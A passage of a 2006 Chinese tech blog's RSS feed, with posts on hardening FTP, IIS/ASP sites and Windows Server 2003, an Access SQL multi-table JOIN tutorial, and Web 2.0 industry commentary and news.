ＩＩＳ可以将ＦＴＰ站点主目录设为局域网中另一台计算机的共享目录，但在局域网中，共享目录很容易招致其他计算机感染的病毒攻击，严重时甚至会造成整个局域网瘫痪，不到万不得已，最好使用本地目录并将主目录设为ＮＴＦＳ格式的非系统分区中。这样，在对目录的权限设置时，可以对每个目录按不同组或用户来设置相应的权限。右击要设置的目录，进入“共享和安全→安全”中设置，如非必要，不要授予“写入”权限。 ５）尽量不要使用默认端口号２１
启用日志记录，以备出现异常情况时查询原因。
２．Ｓｅｒｖ－Ｕ的安全性设置
与ＩＩＳ的ＦＴＰ服务相比，Ｓｅｒｖ－Ｕ在安全性方面做得比较好。
１）对“本地服务器”进行设置
首先。选中“拦截ＦＴＰ＿ｂｏｕｎｃｅ攻击和ＦＸＰ”。什么是ＦＸＰ呢？通常，当使用ＦＴＰ协议进行文件传输时，客户端首先向ＦＴＰ服务器发出一个“ＰＯＲＴ”命令，该命令中包含此用户的ＩＰ地址和将被用来进行数据传输的端口号，服务器收到后，利用命令所提供的用户地址信息建立与用户的连接。大多数情况下，上述过程不会出现任何问题，但当客户端是一名恶意用户时，可能会通过在ＰＯＲＴ命令中加入特定的地址信息，使ＦＴＰ服务器与其它非客户端的机器建立连接。虽然这名恶意用户可能本身无权直接访问某一特定机器，但是如果ＦＴＰ服务器有权访问该机器的话，那么恶意用户就可以通过ＦＴＰ服务器作为中介，仍然能够最终实现与目标服务器的连接。这就是ＦＸＰ，也称跨服务器攻击。选中后就可以防止发生此种情况。
其次，在“高级”选项卡中，检查“加密密码”和“启用安全”是否被选中，如果没有，选择它们。“加密密码”使用单向ｈａｓｈ函数（ＭＤ５）加密用户口令，加密后的口令保存在ＳｅｒｖＵＤａｅｍｏｎ．ｉｎｉ或是注册表中。如果不选择此项，用户口令将以明文形式保存在文件中；“启用安全”将启动Ｓｅｒｖ－Ｕ服务器的安全成功。
２）对域中的服务器进行设置
前面说过，ＦＴＰ默认为明文传送密码，容易被人嗅探，对于只拥有一般权限的账户，危险并不大，但如果该账户拥有远程管理尤其是系统管理员权限，则整个服务器都会被别人远程控制。Ｓｅｒｖ－Ｕ对每个账户的密码都提供了以下三种安全类型：规则密码、ＯＴＰ Ｓ／ＫＥＹ ＭＤ４和ＯＴＰ Ｓ／ＫＥＹ ＭＤ５。不同的类型对传输的加密方式也不同，以规则密码安全性最低。进入拥有一定管理权限的账户的设置中，在“常规”选项卡的下方找到“密码类型”下拉列表框，选中第二或第三种类型，保存即可。注意，当用户凭此账户登录服务器时，需要ＦＴＰ客户端软件支持此密码类型，如ＣｕｔｅＦＴＰ Ｐｒｏ等，输入密码时选择相应的密码类型方可通过服务器验证。
与ＩＩＳ一样，还要谨慎设置主目录及其权限，凡是没必要赋予写入等能修改服务器文件或目录权限的，尽量不要赋予。最后，进入“设置”，在“日志”选项卡中将“启用记录到文件”选中，并设置好日志文件名及保存路径、记录参数等，以方便随时查询服务器异常原因。
好了，开通你的ＦＴＰ吧。告诉大家：你当站长了。</description>
    </item>
    
    <item>
      <title>配置 Windows Server 2003-IIS 6</title>
      <link>http://example.org/2006/02/25/ftpe69c8de58aa1e599a8e69eb6e8aebeefbc8defbc8de5ae89e585a8e7af87/</link>
      <pubDate>Sat, 25 Feb 2006 07:50:56 +0000</pubDate>
      
      <guid>http://example.org/2006/02/25/ftpe69c8de58aa1e599a8e69eb6e8aebeefbc8defbc8de5ae89e585a8e7af87/</guid>
      <description>配置 Windows Server 2003 &amp;ndash; IIS 6 Microsoft Knowledge Base Article - 324742 这篇文章中的信息适用于: Microsoft Windows Server 2003, Datacenter Edition Microsoft Windows Server 2003, Enterprise Edition Microsoft Windows Server 2003, Standard Edition Microsoft Windows Server 2003, Web Edition Microsoft Windows Server 2003, 64-Bit Datacenter Edition Microsoft Windows Server 2003, 64-Bit Enterprise Edition Microsoft Internet Information Services version 6.0
本分步指南介绍了如何在 Windows Server 2003 环境中设置一个用于匿名访问的 WWW 服务器。
安装 Internet 信息服务
Microsoft Internet 信息服务 (IIS) 是与 Windows Server 2003 集成的 Web 服务。</description>
    </item>
    
    <item>
      <title>安全维护 IIS asp 站点的高级技巧</title>
      <link>http://example.org/2006/02/25/e5ae89e585a8e7bbb4e68aa4-iis-asp-e7ab99e782b9e79a84e9ab98e7baa7e68a80e5b7a7/</link>
      <pubDate>Sat, 25 Feb 2006 03:36:42 +0000</pubDate>
      
      <guid>http://example.org/2006/02/25/e5ae89e585a8e7bbb4e68aa4-iis-asp-e7ab99e782b9e79a84e9ab98e7baa7e68a80e5b7a7/</guid>
      <description>一. 前言
（仅以此文感谢好友bigeagle。不是他，我可能不用这么担心win2000安全问题的。呵呵！）
人说，一朝被蛇咬，十年怕&amp;hellip;..，就是这样。2000年初，当我终于摆脱winnt 4.0 server那可怕的补丁之旅，迈向win2000 server时。我终于可以比较放心我的服务器了。但随着SQL SERVER的补丁出现。我知道，与微软的补丁因缘又开始轮回了。但还好。win2000自动化的管理还是让我放心好多，而以前管理winnt后的失眠症状也逐渐消失了。偶尔还能见到我的&amp;quot;梦&amp;quot;老弟。但这一切都伴随者同bigeagle的一次知心交谈中付之东流了。一次，bigeagle发来qq，给我看了一段代码。我一看就知道这不是bigeagle写的代码，那么烂，不过有点熟悉。再一看，啊？！这不是我的数据库连接字符串吗！！GOD。顿时觉得有一种不祥的预兆。不过还好，这个只是个access的，我还用了一些手段防止他被下载。但这足以让我长时间的失眠又来了。（再次说明，bigeagle不是蛇，他是鹰）
二. 安装过程中的IIS 与 ASP安全防护
（这里只考虑是Web服务器，而不是本地机子上的web开发平台。） 接下来的几天有是几个难熬的日子。我开始重新部署win2000 web服务器的安全策略。找到ASP代码被泄漏的原因。原来，我的补丁每次打得都比较及时的。但一次因为卸载FTP时，重装了IIS，而这之后，我并没有再打补丁而导致最新的漏洞web解析出错。（就是那个较新的漏洞 Translate :f， 用这个加上一些工具就可以看到ASP的代码了。）
首先，开始重装IIS。
这次安装的策略就是安全，够用。去掉一些多余的东西。
1. FTP不要安装了，功能不好，还容易出错，并且漏洞很大。Ftp缺省传输密码的过程可是明文传送，很容易被人截获。（可以考虑用第三方工具。）
2. 一切实例、文档也不要安装了。这是在web服务器上，最好不要这些例子，事实证明可以从这些例子站点突破IIS的防线的。
3. 安装时选择站点目录，建议不要用缺省目录c:\inetpub，最好安装道不是系统盘的盘上。如： d:\IISWEB，可以考虑自建目录。这样即使IIS被突破，也能尽可能的保护好系统文件了。
4. 不要安装html的远程管理。html的远程管理在winnt 4.0还能用的上，但漏洞比较大，而且比较危险，端口号虽然是随机的，但很容易被人扫描道，从而留下隐患。事实上，我们可以通过另一台服务器上的IIS来管理他。这样比较安全。
5. 多余的服务也不要安了，如NNtp，如果不做新闻组。就不要安了。smtp，如果有更好的邮件服务，也不要装它了。
6. 索引服务器。这个索引真的是很有用，但我没有用过他。否则，你可以用他建立个整个站点的文件搜索的，但现在好像大多数的ASP网页都是一个网页，动态从数据库里查询。所以根本用不上索引服务器了，（不是索引不好，而是本身上面的那种ASP文件结构就不适合）所以可以不要安装。
三. 有目的进行安全配置
①、开发前的工作。
首先，启动IIS后，看有没有\iissamples,\IIShelp,\msadc,这些目录，如果有，他们大多是用来作为例子，帮助安装的，删掉他们，再把脚本库也删掉，直到web目录只留下干静的新建的虚拟目录即可。如果有管理的web站点，也删掉他。没有它，我们一样可以工作的更好。 还有看看有没有printer的文件夹，他们大多数都是些通过web来访问打印机的。MS就是怪。为了表示我的功力强大，允许通过web来远程打印。相信没有哪个网络公司是通过web网来打印的把。也不可能让网友来使用你的计算机吧。那好，去掉它。
然后。开始详细配置各个web虚拟目录的安全。大概的策略是这样的。分类每个文件夹管理，如可以把扩展名是相同的分配到同一目录，如*.ASP的，和*.inc就尽量分开。如果是*.ASP的，则开放虚拟目录权限，但将实际目录权限授予administrator,system(完全控制)everyone (rc)即可。这样可以通过web允许读取。但实际上你可以加大安全力度，如果你认为它是比较保密的。如果是*.inc的，则开放目录权限，但不允许通过直接访问。这里又一个技巧了。比如，你可以允许实际目录被everyone访问，但在IIS中，你把改目录浏览项去掉，而包含文件只能被源文件读取，但不允许被直接读取。这样，黑客就不可能下载到你的单机数据库了，而且你的*.inc文件也不会被浏览器直接阅读。
刚才我的老弟&amp;quot;梦&amp;quot;还在问我，有没有办法可以让别人看不到你的连接字符串，你可以试试下面的方法！ 1 首先建立连接字符串，并建立一个单独的文件*.inc（要是*.inc的，不要*.ASP的）你把你的连接字符串用变量复制进来。
如：connstr=&amp;ldquo;&amp;ldquo;Provider=SQLOLEDB.1;Password=passw;&amp;hellip;&amp;hellip;&amp;hellip;&amp;hellip;&amp;hellip;&amp;hellip;..&amp;rdquo;
2 然后建立一个文件夹include，放在根目录里。
3 然后每一个文件用下面的办法打开连接。
如： set conn=server.createobject(&amp;ldquo;adodb.connection&amp;rdquo;) conn.open connstr
4 最后在iis里把include 文件夹用拒绝读的方法保护起来。你会发现，你的连接可以照常打开，但是如果对方看到你的源代码，他也看不到连接字符串，即使他看到了包含文件路径及名称。他也无法下载，或是用ie 打开。所以，可以保护你的连接字符串了。
这里用的方法是NT权限与 IIS权限的共同审核。我们知道，为了让用户从web上访问道服务器的文件，每个安装了IIS后的服务器都会有两个内置账号。I_USExxxxxx，I_WAMxxxxxx（x为你的机器名），这样你就可以有的放矢地预防某些从你的web网络查看你的必要信息的用户了。
当然，还有一些比较好的文件策略你可以参考一下：
如：CGI (.exe, .dll, .cmd, .pl)Everyone (X)不允许读，只能运行。Administrators（完全控制）System（完全控制）。
所以，你在编写ASP应用程序时，尽量归类好你的目录。方便用IIS和NT进行管理。
如，采用下列结构比较好
d:\web\ASPtest\static (放置*.</description>
    </item>
    
    <item>
      <title>Windows Server 2003网络服务器安全攻略</title>
      <link>http://example.org/2006/02/25/windows-server-2003e7bd91e7bb9ce69c8de58aa1e599a8e5ae89e585a8e694bbe795a5/</link>
      <pubDate>Sat, 25 Feb 2006 03:00:28 +0000</pubDate>
      
      <guid>http://example.org/2006/02/25/windows-server-2003e7bd91e7bb9ce69c8de58aa1e599a8e5ae89e585a8e694bbe795a5/</guid>
      <description>Win2003 Server的安全性较之Win2K确实有了很大的提高，但是用Win2003 Server作为服务器是否就真的安全了?如何才能打造一个安全的个人Web服务器?下面我们简单介绍一下…… 一、Windows Server2003的安装
1、安装系统最少两需要个分区，分区格式都采用NTFS格式
2、在断开网络的情况安装好2003系统
3、安装IIS，仅安装必要的 IIS 组件(禁用不需要的如FTP 和 SMTP 服务)。默认情况下，IIS服务没有安装，在添加/删除Win组件中选择“应用程序服务器”，然后点击“详细信息”，双击Internet信息服务(iis)，勾选以下选项:
Internet 信息服务管理器;
公用文件;
后台智能传输服务 (BITS) 服务器扩展;
万维网服务。
如果你使用 FrontPage 扩展的 Web 站点再勾选:FrontPage 2002 Server Extensions
4、安装MSSQL及其它所需要的软件然后进行Update。
5、使用Microsoft 提供的 MBSA(Microsoft Baseline Security Analyzer) 工具分析计算机的安全配置，并标识缺少的修补程序和更新。下载地址:见页末的链接
二、设置和管理账户
1、系统管理员账户最好少建，更改默认的管理员帐户名(Administrator)和描述，密码最好采用数字加大小写字母加数字的上档键组合，长度最好不少于14位。
2、新建一个名为Administrator的陷阱帐号，为其设置最小的权限，然后随便输入组合的最好不低于20位的密码
3、将Guest账户禁用并更改名称和描述，然后输入一个复杂的密码，当然现在也有一个DelGuest的工具，也许你也可以利用它来删除Guest账户，但我没有试过。
4、在运行中输入gpedit.msc回车，打开组策略编辑器，选择计算机配置-Windows设置-安全设置-账户策略-账户锁定策略，将账户设为“三次登陆无效”，“锁定时间为30分钟”，“复位锁定计数设为30分钟”。
5、在安全设置-本地策略-安全选项中将“不显示上次的用户名”设为启用
6、在安全设置-本地策略-用户权利分配中将“从网络访问此计算机”中只保留Internet来宾账户、启动IIS进程账户。如果你使用了Asp.net还要保留Aspnet账户。
7、创建一个User账户，运行系统，如果要运行特权命令使用Runas命令。
三、网络服务安全管理
1、禁止C$、D$、ADMIN$一类的缺省共享
打开注册表，HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\lanmanserver\parameters，在右边的窗口中新建Dword值，名称设为AutoShareServer值设为0
2、 解除NetBios与TCP/IP协议的绑定
右击网上邻居-属性-右击本地连接-属性-双击Internet协议-高级-Wins-禁用TCP/IP上的NETBIOS
3、关闭不需要的服务，以下为建议选项
Computer Browser:维护网络计算机更新，禁用
Distributed File System: 局域网管理共享文件，不需要禁用
Distributed linktracking client:用于局域网更新连接信息，不需要禁用
Error reporting service:禁止发送错误报告
Microsoft Serch:提供快速的单词搜索，不需要可禁用
NTLMSecuritysupportprovide:telnet服务和Microsoft Serch用的，不需要禁用
PrintSpooler:如果没有打印机可禁用
Remote Registry:禁止远程修改注册表</description>
    </item>
    
    <item>
      <title>我也有blog了</title>
      <link>http://example.org/2006/02/25/e68891e4b99fe69c89bloge4ba86/</link>
      <pubDate>Sat, 25 Feb 2006 02:42:40 +0000</pubDate>
      
      <guid>http://example.org/2006/02/25/e68891e4b99fe69c89bloge4ba86/</guid>
      <description>呵呵</description>
    </item>
    
    <item>
      <title>多表联接</title>
      <link>http://example.org/2006/02/22/211/</link>
      <pubDate>Wed, 22 Feb 2006 12:55:28 +0000</pubDate>
      
      <guid>http://example.org/2006/02/22/211/</guid>
      <description>多表联接建立记录集是十分有用的，因为某些情况下，我们需要把数字数据类型显示为相应的文本名称，这就遇到了多表联接建立记录集的问题。比如作一个会员注册系统，共有五个表，会员信息数据表member、会员身份表MemberIdentity、会员权限表MemberLevel、会员类别表MemberSort和会员婚姻状况表Wedlock。如果想把会员注册信息全部显示出来，肯定要将这四个表连起来，否则大家看到的某些会员信息可能只是数据编号。 以会员类别表来说，在其数据表中，1代表普通会员，2代表高级会员，3代表终身会员，在显示时，如果不将会员类别表与会员详细数据表相关联，那么假如我们现在看到的是一名普通会员的注册信息，我们只能看到其类别为1，而谁又会知道1代表的是普通会员呢？所以要将会员类别表与会员详细数据表相关联，关联后，1就显示为普通会员，2就显示为高级会员，3就显示为终身会员，这样多好？同理，其它两个表也要与会员详细数据表相关联才能把数据编号显示为相应的名称。
前天制作网站后台时遇到此问题，在面包论坛、狂迷俱乐部、蓝色理想、和5D多媒体论坛发了贴子求救，都没有获得答案，只好自己研究，花了两天时间终于成功，现将其写成教程供大家分享，希望大家少走弯路。 本教程是把五个表联在一起，如果愿意，您可以将更多的表联在一起，方法大同小异啦~
步骤一：用Access软件建立一个名为Member的数据库，在其中建五个表，分别为：会员信息数据表member、会员身份表MemberIdentity、会员权限表MemberLevel、会员类别表MemberSort和会员婚姻状况表Wedlock。
●会员信息数据表member： MemberID：自动编号，主键（ID号） MemberSort：数字（会员类别） MemberName：文本，会员姓名 Password：文本（会员密码） MemberLevel：数字（会员权限） MemberIdentity：数字（会员身份） Wedlock：数字（婚姻状况） MemberQQ：文本（QQ号码） MemberEmail：文本（会员邮箱） MemberDate：日期/时间（会员注册日期）
●会员身份表MemberIdentity： MemberIdentity：自动编号，主键（ID号） IdentityName：文本（会员身份名称）
●会员权限表MemberLevel： MemberLevel：自动编号，主键（ID号） LevelName：文本（会员权限名称）
●会员类别表MemberSort： MemberSort：自动编号，主键（ID号） SortName：文本（会员类别名称）
●会员婚姻状况表Wedlock Wedlock：自动编号，主键（ID号） WedlockName：文本（会员婚姻状况类别） 说明：五个表建好后，您可以自行设置您想要的类别，如会员权限，您可以设置两个类别－－“未付费会员”和“已付费会员”，编号分别为“1”、“2”，如您设置了三个选项，那么第三个选项的编号当然就是“3”了。 下面我们所要作的工作就是把“1”、“2”之类的编号显示为“未付费会员”和“已付费会员”，否则，大家谁会知道“1”代表的是“未付费会员”，“2”代表的是“已付费会员”？
步骤二：建DSN数据源，建记录集 ●运行Dreamweaver MX软件，在会员注册信息显示页面建一个名为ConnMember（您也可以起其它的名称）的DSN数据源。
●点击服务器行为面板中的“绑定”，建一个名为MemberShow的数据集，“连接”选择ConnMember，“表格”选择Member，“列”全选，“排序”选择MemberDate，降序。点击“高级”按钮，修改SQL框中自动生成的代码： 原代码为： Select * FROM Member ORDER BY MemberDate DESC
将代码修改为： Select * FROM (((Member INNER JOIN MemberSort ON Member.MemberSort=MemberSort.MemberSort) INNER JOIN MemberLevel ON Member.MemberLevel=MemberLevel.MemberLevel) INNER JOIN MemberIdentity ON Member.MemberIdentity=MemberIdentity.MemberIdentity) INNER JOIN Wedlock ON Member.Wedlock=Wedlock.Wedlock ORDER BY MemberDate DESC 修改完代码后，点击“确定”，大功告成！ 现在，您可以打开记录集看一下，五个表中的字段全部集成在MemberShow记录集中，您只要将相应的字段绑定在该字段想显示的单元格中即可。这下好了，所有的数字编号全部变成了相应的名称，如会员权限，不再是“1”和“2”的数字形式了，而是变成了相应的名称“未付费会员”和“已付费会员”。其它的数字编号也变成了显示的文本名称，是不是很开心呢？</description>
    </item>
    
    <item>
      <title>Web2.0萌发“纳斯达克”冲动</title>
      <link>http://example.org/2006/02/05/web20e8908ce58f91e2809ce7bab3e696afe8bebee5858be2809de586b2e58aa8/</link>
      <pubDate>Sun, 05 Feb 2006 12:08:53 +0000</pubDate>
      
      <guid>http://example.org/2006/02/05/web20e8908ce58f91e2809ce7bab3e696afe8bebee5858be2809de586b2e58aa8/</guid>
      <description>焦集瑩 新京报
继博客网、天际网、中国博客网等知名网站成功融资千万美元之后，SN类型的网站也开始获得风险投资青睐。碰碰网高层日前告诉记者，他们已获得软银亚洲的1250万美元风投，该公司高层同时披露了一个引人关注的消息———计划于两年内登陆纳斯达克。如果成功，该公司将成为国内首家登陆纳市的Web2.0网站。而在此之前，博客网高层也公开表示，他们上市的目标已经盯准了纳斯达克市场。
Web2.0澄清盈利模式
就在半年之前，Web2.0公司的盈利模式还曾广受质疑，业界认为其模糊的盈利问题一直都处于瓶颈之中，缺乏一个完美的解决方案。之后博客网创始人方兴东率先对此做出澄清，“Web2.0模式的网站目前盈利模式可以有三方面，一是传统资讯频道广告业务，二是各类无线增值业务，三是社区用户的增值服务。”而浩天公司认为，无线资源结合线下执行，可形成一条贯穿线上、线下和无线的三位一体的影音娱乐交友产业链。不久之后，3G商用，web和wap进一步结合，这一产业链将成为2.0网站的盈利解决方案之一。
作为垂直型专业网站，碰碰网等公司打造出的“兴趣＋交友”类型SN社交网站，在经营方面也探索出了一种崭新的经营模式：WAP2.0+ Web2.0，将无线资源与SN交友结合在一起，率先解决了Web2.0的盈利瓶颈。
碰碰网之前，国内另一著名的SN网站天际网也获得了风投的青睐，“此类网站主要以个人信息为主，针对不同的职业和服务需求而建立，模式十分看好。”天际网总裁林峯告诉记者，该公司目前也已经获得AOL、高盛、新浪、易趣等公司的创始人的投资。
不仅如此，他还表示，IDG这样的大型风险投资机构也在私下里与其沟通过，IDG正在密切关注Web2.0模式在中国市场的发展，一旦前景理想，很有可能进行投资。“2006年，Web2.0模式将彻底改变互联网的格局，进而获得更多的资本市场青睐。”
“只去纳斯达克”
根据业界统计，2005年全球有20多亿美元风险投资流入中国，很多美国顶级风险投资商准备将20%－30％的资金投入中国市场。大量资本的流入将重新塑造中国互联网新格局。正是在广泛的风险投资支持下，这批Web2.0公司也纷纷萌发了上市的冲动。
“融资之后最根本的就是制定长远战略，也就是我们刚刚发布的新生活方式战略，不是转型，而是战略提升。 Web2.0的总体方向没有变，以博客为核心业务，通过系统和产品的升级，而不仅仅是简单的个人发表和网上日记。”博客网董事长方兴东称，上市目标地点只锁定纳斯达克。
无独有偶，希望借鉴美国同类公司成功案例的中国博客网等公司，也都在蓄势待发。“Web2.0公司的上市冲动已经空前高涨起来，或许是看中了百度沾光Google的缘故，他们认为有着成功先例的美国股市是最好的去处。”一位业内人士如是评价。</description>
    </item>
    
    <item>
      <title>IBM Google等巨头联手支持Open Ajax计划</title>
      <link>http://example.org/2006/02/03/ibm-googlee7ad89e5b7a8e5a4b4e88194e6898be694afe68c81open-ajaxe8aea1e58892/</link>
      <pubDate>Fri, 03 Feb 2006 14:36:25 +0000</pubDate>
      
      <guid>http://example.org/2006/02/03/ibm-googlee7ad89e5b7a8e5a4b4e88194e6898be694afe68c81open-ajaxe8aea1e58892/</guid>
      <description>IBM、Google、雅虎、甲骨文等IT巨头联手支持Open Ajax计划，旨在推广一种名为“Ajax”的新兴的Web开发技术。
道琼斯新闻：IBM、Google、雅虎、甲骨文等IT巨头联手支持Open Ajax计划。IBM、Google、雅虎、甲骨文和BEA系统等许多高科技公司宣布共同支持一个开源软件计划，旨在推广一种名为“Ajax”的新兴的Web开发技术。
IBM在星期三举行的新闻发布会上说，这个新的“Open Ajax”计划旨在推广Ajax通用的兼容性的潜力以及很容易结合到新的和现有的软件程序中。AJAX是“异步JavaScript和XML”的缩写字，是一种快速创建互联网应用程序的方法，其响应速度比传统的网站快得多。这种技术能够让网站更新一个网页的部分内容，而不必刷新整个网页。Ajax网络应用程序还能够验证输入到表格中的数据，而不必等待服务器的验证。
然而，这个技术需要大量的软件工程资源并且缺少开发工具和实施工具的广泛支持。“Open Ajax”计划就是要解决这些问题。IBM计划向开源软件开发环境Eclipse Foundation和免费的火狐浏览器的开发者Mozilla公司捐献自己的一些软件。Ajax技术开发的所谓的丰富的互联网程序与Adobe系统公司的Flash技术进行竞争。而微软正在开发自己的名为“Atlas”的Ajax开发工具。</description>
    </item>
    
    <item>
      <title>东拉西扯：中国企业为什么对Web 2.0没兴趣</title>
      <link>http://example.org/2006/01/27/e4b89ce68b89e8a5bfe689afefbc9ae4b8ade59bbde4bc81e4b89ae4b8bae4bb80e4b988e5afb9web-20e6b2a1e585b4e8b6a3/</link>
      <pubDate>Fri, 27 Jan 2006 19:53:11 +0000</pubDate>
      
      <guid>http://example.org/2006/01/27/e4b89ce68b89e8a5bfe689afefbc9ae4b8ade59bbde4bc81e4b89ae4b8bae4bb80e4b988e5afb9web-20e6b2a1e585b4e8b6a3/</guid>
      <description>Web 2.0对企业内部知识管理、信息组织等方面的价值，这里就不说了，单说说对企业处理公共关系的价值。 以前，企业很难直接面对用户和市场，他们往往需要绕道媒体，通过媒体向用户传达企业的声音。这一点在中国尤其明显，在很多企业的观念中，公共关系不就是跟媒体打交道的艺术吗。所以PR经理的主要职责，无非是上稿、撤稿，请媒体的“朋友”吃吃饭，逢年过节关怀一下。在话语权掌握在媒体手中的时候，这么做也许是有效的。但随着互联网作为信息传播主渠道的作用越来越明显，随着内容发布权越来越平民化，也许要不了多久，这些企业就会发现，他们可以撤掉网媒上的某篇负面报道，但他们越来越难以封堵众多讲话的嘴。比如最近这起汉芯涉嫌造假事件，互联网最终将让当事各方越来越被动，就像三年前的SARS事件。
潘欣曾经写过一系列“网络营销2.0”的文章，针对的就是国内企业在Web 2.0浪潮中的集体失语。既然连普通网民都懂得借助新的互联网工具，来表达，来沟通，国内企业对这些工具的漠视，是难以理解的。
我们可以看看，跨国公司是如何利用Web 2.0工具，与外界进行对话的。Google不但有官方blog、新闻blog，几乎每个产品都有自己的独立blog，Google的很多员工，一直都是最积极的blogger。微软、Yahoo!、IBM、Sun等，也都尝试通过blog直接面对用户和媒体。微软的CTO、Sun的总裁，都有自己的blog。另外，微软的官方新闻、技术资讯也都提供RSS供订阅。
当企业开始与用户直接沟通的时候，就像个人因写blog而变得真实一样，企业也同样不再是只会发公关稿、只会自我吹嘘的死板的旧形象了。根据Google官方blog的报告，去年下半年，Google官方blog共有430万独立访问者，870万pageviews。访客来自世界各地，例如5.3万访问者来自土耳其，16万来自法国，3万来自泰国。去年一年，Google通过官方blog，发布了38个小技巧，宣布了77个新产品和服务，回答了17个有关政策和法律的问题。此外，还邀请了11名客座blogger，撰写了40个有关Google日常生活的帖子，19个有关国际问题看法的帖子。Google的官方blog，本身已经成为一个有影响力的媒体。
在李开复与微软的官司中，Google也通过建立“Google与李开复博士”这个blog，陈述事实，传达看法。
善用Web 2.0工具，好处是显而易见的。国内企业之所以对此无动于衷，除了对这些新工具的了解有限之外，我想还有一个很重要的原因：不规范的操作太多。因为很多东西没有办法放到阳光下，企业对这种开放式沟通就很忌惮。倒是很多互联网创业者，已经娴熟地掌握了Web 2.0的沟通技巧。
我有一个基本判断，透明度通常和企业自身的干净程度成正比。那些总是喜欢通过媒体发软文、搞公关、作秀造势的企业，内部多半问题成堆。而那些敢于赤裸裸站在用户面前的企业，更值得信任一些。这跟企业大小无关，在IT界，没有比微软、Google更大的企业，微软、Google能做，你怎么就不能做？
转自http://blog.donews.com/keso/archive/2006/01/27/709596.aspx</description>
    </item>
    
    <item>
      <title>让Web2.0成功商业化</title>
      <link>http://example.org/2006/01/27/e8aea9web20e68890e58a9fe59586e4b89ae58c96/</link>
      <pubDate>Fri, 27 Jan 2006 18:07:47 +0000</pubDate>
      
      <guid>http://example.org/2006/01/27/e8aea9web20e68890e58a9fe59586e4b89ae58c96/</guid>
      <description>原文：Making Web 2.0 Commercially Successful 作者：Dion Hinchcliffe’s Web 2.0 Blog
从这周末的主流媒体讨论可以看出，比起原先疯狂投机的.com，Web2.0在更好的、更健康的繁荣兴起，我花些时间思考了Web2.0软件成功商业化的方法。当然，大多数Web2.0通常采用合并和收购的模式起家的。在这种模式下，通过那些独一无二的，炙手可热的特性，吸引大量的基础用户来构建一个成功的服务，这样你所投资的就物有所值，而且基础用户对你的关注程度也会吸引买家的眼球。
但是人人所知的，你如何使用Web2.0的观念来获得商业成功呢？确实，Google、eBay，还有iTunes显示出他们可以成功的能力，但是知道所有可行的方案还是至关重要的，尤其是你模式完全不同于Google的广告模式或eBay和iTunes的付费使用的模式。这个问题的答案是令人着迷的。探索各式各样通向成功商业化道路也就是关于Web2.0诸多故事中的重要的一篇。
ZDNet的Phil Wainwright 目前列出了从随选软件服务中产生收入的通用方法。他所列举的主流盈利模式，通常都是商业化Web2.0公司提供的软件服务。
这些仅仅指出如何针对你提供的服务来获得商业利益的方法。在Web2.0时代，获得成功不仅仅靠网上收入，你得分享你的市场。保持成功你还需要留住无比重要的用户，这样你才可以继续获得投资者，并丰富你的数据，保证比后来人作得更好。还需要在网上提供最好的内容和功能，并能够确保坚持下去。而且这也是商业化成功需要面对的下一个重要的因素。如我所悟，至少有4种方法让你的内容或功能与众不同。那就是专利技术、难以再生的数据资源、具有版权的内容，以及机密的程式。
commercial web 2.0
如果你看看Web2.0世界里的大腕儿，他们都或多或少的具有这些机制，使得你使用他们的服务。iTunes的音乐和视频库（具有版权的内容）、Google的搜索引擎（机密的程式和专利技术）、或del.icio.us提供internet上最好的书签（难以再生的数据资源）。而眼下，像Wikipedia使用开源数据库不再局限于具有版权的资源，你可以预计在Web2.0世界里，专利将会变成一个愈来愈重要的因素。就像发生在80年代和90年代末的每个计算机的大革命，没完没了的法律争斗来证实到底谁想出了最好的点子，你可以目睹Web2.0将在未来的5年到10年内关于内容和功能的合法保护发行版权上Web2.0大腕儿们的争斗。
实际上，专利现在被理解为一个公司固有价值的一个完整部分，而且在近几年由于大量软件专利授权的节节攀升，软件专利法案成长得特别快。如果诸多玩家通过使用专有的技术来并巩固他们的霸主地位，那么这场争夺的结果将很有可能终止Web2.0的革命。
你如何认为呢？Web2.0公司会采取专利保护手段来获取长久的胜利么？
（indigo, sirtoozee 翻译整理 出自“blog中文翻译”）
转自:http://technorati.com</description>
    </item>
    
    <item>
      <title>2005年web 2.0十大事件</title>
      <link>http://example.org/2006/01/27/2005e5b9b4web-20e58d81e5a4a7e4ba8be4bbb6/</link>
      <pubDate>Fri, 27 Jan 2006 18:04:47 +0000</pubDate>
      
      <guid>http://example.org/2006/01/27/2005e5b9b4web-20e58d81e5a4a7e4ba8be4bbb6/</guid>
      <description>原文标题和地址:Top Ten Web 2.0 Moments of 2005 作者:Richard MacManus 12.15
2005年web 2.0十大事件
2月，Ask Jeeves收购 bloglines ，类似的还有AOL收购weblogsinc.
Alexa开放Web搜索数据库
6月底，微软宣布在新一代操作系统Windows Vista中支持RSS，11月又宣布推出SSE
Ajax。其实ajax并不是什么新技术，不过ajax这个词却是今年首次出现的，源于Jesse James Garrett 2月的一篇文章Ajax: A New Approach to Web Applications
9月，Memeorandum新版上线，digg崛起也值得关注
11月，Google Base登场，有人担心它会成为craigslist or eBay killer，不过我基本没用。
4 .Yahoo3月收购Flickr，7月收购Konfabulator ，12月收购del.icio.us,动作当真不小。
eBay9月收购Skype。引人注目的是收购价格：２６－４１亿美元！
微软11月宣布Live战略
web2.0大会 (doubleaf摘译并点评)
转自:http://technorati.com</description>
    </item>
    
    <item>
      <title>你需要什么web2.0服务？</title>
      <link>http://example.org/2006/01/27/e4bda0e99c80e8a681e4bb80e4b988web20e69c8de58aa1efbc9f/</link>
      <pubDate>Fri, 27 Jan 2006 12:02:58 +0000</pubDate>
      
      <guid>http://example.org/2006/01/27/e4bda0e99c80e8a681e4bb80e4b988web20e69c8de58aa1efbc9f/</guid>
      <description>今天距herock邀我一起做web2week正好一月零2天，惭愧的是，这一段时间什么都没写。今天中午和herock吃了顿饭之后，这种愧疚感更加强烈，于是决定写点东西。 但是，我对web2.0－－其实我并不十分愿意称之为web 2.0，而愿意像zhanbin那样，叫它变化中的互联网－－的看法很粗浅，只能先说说国外牛人的观点，中间会有一些我理解上的误差，各位看官敬请指正。
TechCrunch.com的Mike Arrington 上个月在一篇文章中，提到了10种希望但目前尚未出现的web 2.0产品（由于距写作时间已有1个多月，因此其中一些愿望实际上已经有人帮他实现了）
